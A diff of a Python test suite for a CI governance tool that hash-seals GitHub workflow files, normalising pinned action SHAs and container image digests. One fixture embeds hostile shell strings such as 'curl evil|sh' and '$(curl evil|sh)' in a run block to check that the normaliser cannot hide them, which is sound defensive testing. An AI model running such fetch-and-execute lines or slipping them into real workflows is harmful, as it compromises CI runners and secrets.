@@ -92,7 +92,7 @@ def make_repo(tmp, params=None, jobs=("lint",), extra_jobs=(), slice_name="APAP_
     params_path = repo / "ci-pattern.yaml"
     params_path.write_text(params if params is not None else VALID_PARAMS, encoding="utf-8")
     manifest = {
-        "schema_version": 1,
+        "schema_version": CLI.SCHEMA_VERSION,
         "adopted_at": "2026-10-02T12:00:00Z",
         "canonical_version": "0.4",
         "canonical_source": {"repo": "DysTelefonica/team-skills", "path": "personal/ardelperal/ci-pattern"},
@@ -207,7 +207,7 @@ class ManifestRoundTripTests(unittest.TestCase):
             repo = Path(tmp) / "repo2"
             repo.mkdir()
             manifest = {
-                "schema_version": 1,
+                "schema_version": CLI.SCHEMA_VERSION,
                 "adopted_at": "2026-10-02T00:00:00Z",
                 "canonical_version": "0.4",
                 "canonical_source": {"repo": "r", "path": "p"},
@@ -217,6 +217,718 @@ class ManifestRoundTripTests(unittest.TestCase):
             }
             CLI.write_manifest(repo, manifest)
             self.assertEqual(CLI.load_manifest(repo), manifest)
+
+
+class ManifestSealTests(unittest.TestCase):
+    """#1172: el sello desalineado dice el hash esperado y el comando de
+    re-sellar, y el comando existe (`manifest seal`).
+
+    La auditoría de fricción (#1093) medio 13 job-runs rojos del gate
+    `governance-seals` por el mismo motivo: el manifiesto no coincide con el
+    árbol y el mensaje no decía ni el hash esperado ni cómo re-sellar.
+    """
+
+    def _drifted_repo(self, tmp):
+        repo, _ = make_repo(tmp)
+        target = repo / "scripts/check_pr_size.py"
+        target.write_text("# contenido nuevo\n", encoding="utf-8")
+        return repo, target
+
+    def test_seal_updates_the_hash_of_the_declared_files(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._drifted_repo(tmp)
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            manifest = json.loads(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+            self.assertEqual(manifest["files"]["scripts/check_pr_size.py"], sha(target))
+
+    def test_seal_with_out_does_not_touch_the_tree(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._drifted_repo(tmp)
+            before = (repo / ".governance-manifest.json").read_text(encoding="utf-8")
+            out_path = Path(tmp) / "sello" / "manifesto.json"
+            code, out, err = run_cli(["manifest", "seal", str(repo), "--out", str(out_path)])
+            self.assertEqual(code, 0, out + err)
+            self.assertEqual(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"), before)
+            sealed = json.loads(out_path.read_text(encoding="utf-8"))
+            self.assertEqual(sealed["files"]["scripts/check_pr_size.py"], sha(target))
+
+    def test_seal_refuses_a_declared_file_that_is_not_in_the_tree(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._drifted_repo(tmp)
+            (repo / "scripts/check_pr_size.py").unlink()
+            before = (repo / ".governance-manifest.json").read_text(encoding="utf-8")
+            code, _out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 1)
+            self.assertIn("scripts/check_pr_size.py", err)
+            # El manifiesto NO se re-sella a medias: lo declarado y ausente se nombra.
+            self.assertEqual(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"), before)
+
+    def test_seal_keeps_the_order_of_the_manifest(self):
+        """#1415: re-sellar un hash no reordena el manifiesto; el diff que se
+        revisa es la línea del hash, no el fichero entero."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._drifted_repo(tmp)
+            path = repo / ".governance-manifest.json"
+            manifest = json.loads(path.read_text(encoding="utf-8"))
+            manifest["files"] = dict(reversed(list(manifest["files"].items())))
+            unsorted = {k: manifest[k] for k in reversed(list(manifest))}
+            path.write_text(json.dumps(unsorted, indent=2) + "\n", encoding="utf-8")
+            before = path.read_text(encoding="utf-8").splitlines()
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            after = path.read_text(encoding="utf-8").splitlines()
+            self.assertEqual(len(after), len(before))
+            changed = [b for a, b in zip(before, after, strict=True) if a != b]
+            self.assertEqual(len(changed), 1, changed)
+            self.assertIn("scripts/check_pr_size.py", changed[0])
+
+    def test_seal_keeps_the_line_endings_of_the_manifest(self):
+        """Un manifiesto commiteado con CRLF (cadete) no sale reescrito entero
+        al re-sellar un hash: el sello conserva sus finales de línea."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._drifted_repo(tmp)
+            path = repo / ".governance-manifest.json"
+            crlf = path.read_bytes().replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
+            path.write_bytes(crlf)
+            before = crlf.rstrip(b"\r\n").split(b"\r\n")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            after_bytes = path.read_bytes()
+            self.assertEqual(after_bytes.count(b"\n"), after_bytes.count(b"\r\n"))
+            after = after_bytes.rstrip(b"\r\n").split(b"\r\n")
+            self.assertEqual(len(after), len(before))
+            self.assertEqual(len([a for a, b in zip(before, after, strict=True) if a != b]), 1)
+
+    def test_seal_with_out_keeps_the_order_of_the_manifest(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._drifted_repo(tmp)
+            path = repo / ".governance-manifest.json"
+            manifest = json.loads(path.read_text(encoding="utf-8"))
+            unsorted = {k: manifest[k] for k in reversed(list(manifest))}
+            path.write_text(json.dumps(unsorted, indent=2) + "\n", encoding="utf-8")
+            out_path = Path(tmp) / "sello.json"
+            code, out, err = run_cli(["manifest", "seal", str(repo), "--out", str(out_path)])
+            self.assertEqual(code, 0, out + err)
+            sealed = json.loads(out_path.read_text(encoding="utf-8"))
+            self.assertEqual(list(sealed), list(unsorted))
+
+    def test_seal_is_idempotent(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._drifted_repo(tmp)
+            self.assertEqual(run_cli(["manifest", "seal", str(repo)])[0], 0)
+            once = (repo / ".governance-manifest.json").read_text(encoding="utf-8")
+            self.assertEqual(run_cli(["manifest", "seal", str(repo)])[0], 0)
+            self.assertEqual(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"), once)
+
+    def test_the_mismatch_names_the_expected_hash_and_the_command(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._drifted_repo(tmp)
+            code, out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 1)
+            expected = json.loads(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+            self.assertIn(expected["files"]["scripts/check_pr_size.py"], out + err)
+            self.assertIn(sha(target), out + err)
+            self.assertIn("ci-pattern manifest seal", out + err)
+
+    def test_the_phase_three_mismatch_names_the_expected_hash_and_the_command(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._drifted_repo(tmp)
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            drift = [f for f in findings if "check_pr_size.py" in f]
+            self.assertEqual(len(drift), 1, findings)
+            expected = json.loads(
+                (repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+            self.assertIn(expected["files"]["scripts/check_pr_size.py"], drift[0])
+            self.assertIn(sha(target), drift[0])
+            self.assertIn("ci-pattern manifest seal", drift[0])
+
+    def test_seal_without_a_manifest_is_exit_3(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            empty = Path(tmp) / "vacio"
+            empty.mkdir()
+            code, _out, err = run_cli(["manifest", "seal", str(empty)])
+            self.assertEqual(code, 3)
+            self.assertIn("manifest", err.lower())
+
+
+class NormalizedWorkflowSealTests(unittest.TestCase):
+    """#1199: los workflows se sellan sobre su contenido NORMALIZADO.
+
+    Un bump de Dependabot cambia el sha pineado de un `uses:` y su comentario de
+    version: eso no es un cambio de logica y no debe romper el sello. Lo que si
+    es cambio de logica (los pasos, el `run:`, los `permissions:`, el `if:`,
+    los `needs:`) y el nombre de la action que se usa, deben seguir rompiendolo:
+    el sello protege a los guardianes del merge, no a los pins.
+    """
+
+    WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-24.04\n"
+        "    permissions:\n"
+        "      contents: read\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+        "      - run: echo hola\n"
+    )
+    CHECKOUT_OLD = "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1"
+    CHECKOUT_NEW = "actions/checkout@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2"
+
+    def _repo(self, tmp, workflow=None, rel=".github/workflows/ci.yml"):
+        repo = Path(tmp) / "repo"
+        target = repo / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(workflow if workflow is not None else self.WORKFLOW, encoding="utf-8")
+        manifest = {
+            "schema_version": CLI.SCHEMA_VERSION,
+            "files": {rel: CLI.sha256_governed(target, rel)},
+        }
+        (repo / ".governance-manifest.json").write_text(
+            json.dumps(manifest, indent=2), encoding="utf-8")
+        return repo, target
+
+    def _sealed(self, repo):
+        return json.loads((repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+
+    def test_a_bump_of_a_pinned_action_does_not_change_the_seal(self):
+        """Un bump de Dependabot (sha y comentario) no mueve el sello."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            before = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.CHECKOUT_OLD, self.CHECKOUT_NEW),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("0 con el hash cambiado", out)
+            self.assertEqual(
+                self._sealed(repo)["files"][".github/workflows/ci.yml"], before)
+
+    def test_the_gate_accepts_a_workflow_with_a_bumped_action(self):
+        """La fase 3 no da hallazgo tras un bump de Dependabot."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.CHECKOUT_OLD, self.CHECKOUT_NEW),
+                encoding="utf-8")
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            self.assertEqual(findings, [])
+
+    def test_a_change_of_the_run_of_a_workflow_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("echo hola", "echo adios"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_change_of_the_permissions_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "      contents: read", "      contents: write"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_change_of_the_if_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            workflow = self.WORKFLOW.replace(
+                "    steps:\n", "    if: github.event_name == 'push'\n    steps:\n")
+            repo, target = self._repo(tmp, workflow=workflow)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "github.event_name == 'push'", "github.event_name == 'pull_request'"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_the_name_of_the_action_is_part_of_the_seal(self):
+        """Cambiar QUE action se usa es logica: rompe el sello."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
+                    "actions/setup-python@11bd71901bbe5b1630ceea73d27597364c9af683"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_the_gate_reports_a_workflow_whose_logic_changed(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("echo hola", "echo adios"),
+                encoding="utf-8")
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            drift = [f for f in findings if "ci.yml" in f]
+            self.assertEqual(len(drift), 1, findings)
+            self.assertIn("ci-pattern manifest seal", drift[0])
+
+    def test_the_seal_is_the_hash_of_the_normalized_content(self):
+        """El hash sellado es el del contenido con el pin a un marcador fijo."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(self._sealed(repo)["files"][".github/workflows/ci.yml"], expected)
+
+    PAYLOAD_WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          echo \"pin:] / [uses: a/b@0123456789abcdef0123456789abcdef01234567 "
+        "# $(id)\"; curl evil|sh #\"\n"
+        "          cat <<EOF\n"
+        "          uses: a/b@0123456789abcdef0123456789abcdef01234567 # $(curl evil|sh)\n"
+        "          EOF\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+    )
+
+    def test_the_content_of_a_run_block_is_not_normalized(self):
+        """Lo que va dentro de un `run: |` es shell, no YAML: no se normaliza.
+
+        Una linea que parece una clave `uses:` pero lleva carga util detras del
+        `#` tiene que seguir dentro del contenido sellado; si se normalizara,
+        cambiarla no moveria el sello y el guardrian no veria la logica.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            self.assertIn("curl evil|sh", normalized)
+
+    def test_a_change_inside_a_run_block_breaks_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "curl evil|sh", "curl otro|sh"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_heredoc_inside_a_run_block_is_not_normalized(self):
+        """El heredoc sin comillas es shell: tampoco se normaliza."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            self.assertIn("$(curl evil|sh)", normalized)
+
+    def test_a_pin_without_a_space_before_the_comment_is_not_normalized(self):
+        """`uses: a/b@<sha>#algo` no es un comentario de version: el sha se sella."""
+        with tempfile.TemporaryDirectory() as tmp:
+            workflow = self.WORKFLOW.replace(
+                self.CHECKOUT_OLD, "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683#evil")
+            repo, target = self._repo(tmp, workflow=workflow)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            expected = "sha256:" + hashlib.sha256(
+                target.read_text(encoding="utf-8").encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "11bd71901bbe5b1630ceea73d27597364c9af683",
+                    "cf430e030ddbb5b0abf93d22962f4752f3646cd9"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    IMAGE = "mcr.microsoft.com/playwright"
+    IMAGE_OLD = IMAGE + ":v1.60.0-noble@sha256:" + "1" * 64
+    IMAGE_NEW = IMAGE + ":v1.64.1-noble@sha256:" + "2" * 64
+    IMAGE_WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  e2e:\n"
+        "    runs-on: ubuntu-24.04\n"
+        "    container:\n"
+        f"      image: {IMAGE_OLD}\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+        "      - run: echo hola\n"
+    )
+
+    def test_a_bump_of_an_image_tag_and_digest_does_not_change_the_seal(self):
+        """Un bump de Dependabot de una imagen fijada por digest no mueve el sello (#1361).
+
+        El tag y el digest cambian juntos; el nombre de la imagen es logica y
+        se queda dentro del sello (ver los tests de abajo).
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            before = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(self.IMAGE_OLD, self.IMAGE_NEW),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("0 con el hash cambiado", out)
+            self.assertEqual(self._sealed(repo)["files"][".github/workflows/ci.yml"], before)
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            self.assertEqual(findings, [])
+
+    def test_a_change_of_the_image_name_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(self.IMAGE, "mcr.microsoft.com/otra"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_digest_removed_from_an_image_changes_the_seal(self):
+        """Quitar el pin de la imagen es un cambio de contenido: el sello lo ve."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.IMAGE_OLD, self.IMAGE + ":v1.60.0-noble"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_change_of_a_step_next_to_the_image_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("echo hola", "echo adios"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_an_image_line_inside_a_run_block_is_not_normalized(self):
+        """Una linea `image:` dentro de un `run: |` es shell: no se normaliza."""
+        workflow = self.IMAGE_WORKFLOW.replace(
+            "      - run: echo hola\n",
+            "      - run: |\n          image: evil@sha256:" + "3" * 64 + "\n")
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=workflow)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("image: evil@", "image: pwn@"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def _assert_bump_breaks_seal(self, workflow, old, new):
+        """Un bump de una referencia que NO se normaliza cambia el sello (fallo cerrado, #1361)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=workflow)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(old, new), encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_docker_run_in_a_run_line_is_not_normalized(self):
+        """`docker run` dentro de `run:` es shell, no una clave `image:` (#1361).
+
+        cadete#665 usa esta forma: su bump sigue rompiendo el sello y exige re-sellar.
+        """
+        self._assert_bump_breaks_seal(
+            self.WORKFLOW.replace(
+                "      - run: echo hola\n",
+                f"      - run: docker run --rm {self.IMAGE_OLD} echo hola\n"),
+            self.IMAGE_OLD, self.IMAGE_NEW)
+
+    def test_a_docker_run_in_a_run_block_is_not_normalized(self):
+        self._assert_bump_breaks_seal(
+            self.WORKFLOW.replace(
+                "      - run: echo hola\n",
+                f"      - run: |\n          docker run --rm {self.IMAGE_OLD} echo hola\n"),
+            self.IMAGE_OLD, self.IMAGE_NEW)
+
+    def test_a_quoted_image_is_not_normalized(self):
+        """`image:` entre comillas no casa la forma normalizada: fallo cerrado (#1361)."""
+        self._assert_bump_breaks_seal(
+            self.IMAGE_WORKFLOW.replace(
+                f"      image: {self.IMAGE_OLD}\n", f'      image: "{self.IMAGE_OLD}"\n'),
+            self.IMAGE_OLD, self.IMAGE_NEW)
+
+    def test_a_short_container_image_is_not_normalized(self):
+        """`container: <imagen>@sha256:…` en forma corta no es una clave `image:` (#1361)."""
+        self._assert_bump_breaks_seal(
+            self.IMAGE_WORKFLOW.replace(
+                f"    container:\n      image: {self.IMAGE_OLD}\n",
+                f"    container: {self.IMAGE_OLD}\n"),
+            self.IMAGE_OLD, self.IMAGE_NEW)
+
+    def test_removing_the_pin_of_an_action_changes_the_seal(self):
+        """Quitar el pin (`@v8` a secas) cambia el sello; el gate de pins lo rechaza aparte (HR-26)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.CHECKOUT_OLD, "actions/checkout@v8"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_manifest_in_the_v2_format_migrates_to_the_v3_algorithm(self):
+        """Migrar de v2 a v3 re-sella con el algoritmo nuevo (#1361).
+
+        El hash v2 solo enmascara los `uses:`; la imagen va en crudo. Tras
+        migrar, el hash es el del contenido con los pins y las imagenes
+        normalizados.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            text = target.read_text(encoding="utf-8")
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 2
+            v2_text = text.replace(self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            manifest["files"][".github/workflows/ci.yml"] = (
+                "sha256:" + hashlib.sha256(v2_text.encode("utf-8")).hexdigest())
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            sealed = self._sealed(repo)
+            self.assertEqual(sealed["schema_version"], CLI.SCHEMA_VERSION)
+            expected = v2_text.replace(self.IMAGE_OLD, self.IMAGE + "@<PIN>")
+            self.assertEqual(
+                sealed["files"][".github/workflows/ci.yml"],
+                "sha256:" + hashlib.sha256(expected.encode("utf-8")).hexdigest())
+
+    def test_the_v3_migration_refuses_a_drift_under_the_v2_algorithm(self):
+        """Una deriva no se esconde al migrar: el hash v2 se comprueba antes (#1361)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 2
+            manifest["files"][".github/workflows/ci.yml"] = "sha256:" + "0" * 64
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 1)
+            self.assertIn("no se migra un manifiesto desalineado", err)
+            self.assertEqual(self._sealed(repo)["schema_version"], 2)
+
+    def test_the_gate_measures_a_v2_manifest_with_the_v2_algorithm(self):
+        """El gate mide el formato 2 con el algoritmo 2 (#1371).
+
+        Antes el canon nuevo no medía el formato 2: la base del consumer, que
+        mide el PR con su canon viejo, lo rechazaba con rc=2. Ahora los dos
+        formatos vivos se miden, cada uno con su algoritmo: el v2 con la
+        imagen en crudo, que es lo que el canon de la base mide.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.IMAGE_WORKFLOW)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 2
+            text = target.read_text(encoding="utf-8")
+            v2_text = text.replace(self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            manifest["files"][".github/workflows/ci.yml"] = (
+                "sha256:" + hashlib.sha256(v2_text.encode("utf-8")).hexdigest())
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            self.assertEqual(findings, [])
+
+    def test_the_migration_is_refused_when_a_declared_file_drifted(self):
+        """Migrar de formato no puede esconder una deriva (#1199).
+
+        Los hashes del formato viejo se comprueban antes de migrar: si un
+        fichero declarado ya no cuadra, el manifiesto describe un contenido que
+        no es el del repo y firmarlo en el formato nuevo lo escondería.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            manifest["files"][".github/workflows/ci.yml"] = "sha256:" + "0" * 64
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 1)
+            self.assertIn("no se migra un manifiesto desalineado", err)
+            self.assertIn(".github/workflows/ci.yml", err)
+            self.assertEqual(self._sealed(repo)["schema_version"], 1)
+
+    def test_a_file_declared_as_resealed_is_not_verified_in_the_migration(self):
+        """Quien re-sella declara que cambia ese fichero: de eso responde él."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            manifest["files"][".github/workflows/ci.yml"] = "sha256:" + "0" * 64
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(
+                ["manifest", "seal", "--reeseal", ".github/workflows/ci.yml", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertEqual(self._sealed(repo)["schema_version"], CLI.SCHEMA_VERSION)
+
+    def test_a_manifest_in_the_old_format_is_refused_and_the_seal_migrates_it(self):
+        """El formato viejo no lo mide ningun gate; `manifest seal` lo migra."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            # Un manifiesto v1 real lleva el hash EN CRUDO de sus ficheros: el
+            # hash normalizado es del formato vigente.
+            manifest["files"][".github/workflows/ci.yml"] = CLI.sha256_file(target)
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 3)
+            self.assertIn("ci-pattern manifest seal", err)
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertEqual(self._sealed(repo)["schema_version"], CLI.SCHEMA_VERSION)
+
+
+class SealSchemaNegotiationTests(unittest.TestCase):
+    """#1371: el formato del sello se negocia con la base del consumer.
+
+    La base de un consumer mide el PR con SU canon (el que lleva en su rama
+    base): un manifiesto en un formato que la base no mide es un rojo (rc=2)
+    en el gate de la base, aunque el canon de la cabeza lo entienda. Por eso
+    el canon nuevo mide los dos formatos vivos (v2 y v3) y `manifest seal`
+    puede sellar en el formato que la base mide.
+    """
+
+    IMAGE = "mcr.microsoft.com/playwright"
+    IMAGE_OLD = IMAGE + ":v1.60.0-noble@sha256:" + "1" * 64
+    REL = ".github/workflows/ci.yml"
+    WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-24.04\n"
+        "    container:\n"
+        f"      image: {IMAGE_OLD}\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+        "      - run: echo hola\n"
+    )
+
+    def _expected_hash(self, schema):
+        """El hash que el formato `schema` sella para este workflow.
+
+        v2 enmascara solo el `uses:`; v3 enmascara tambien la imagen por
+        digest. El hash se calcula aqui, a mano, para no depender de la
+        funcion que se esta probando.
+        """
+        text = self.WORKFLOW.replace(
+            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1",
+            "actions/checkout@<PIN>")
+        if schema >= 3:
+            text = text.replace(self.IMAGE_OLD, self.IMAGE + "@<PIN>")
+        return "sha256:" + hashlib.sha256(text.encode("utf-8")).hexdigest()
+
+    def _repo(self, tmp, schema=CLI.SCHEMA_VERSION):
+        repo = Path(tmp) / "repo"
+        target = repo / self.REL
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(self.WORKFLOW, encoding="utf-8")
+        manifest = {
+            "schema_version": schema,
+            "parameters": {"P23_required_jobs": ["build"]},
+            "files": {self.REL: self._expected_hash(schema)},
+        }
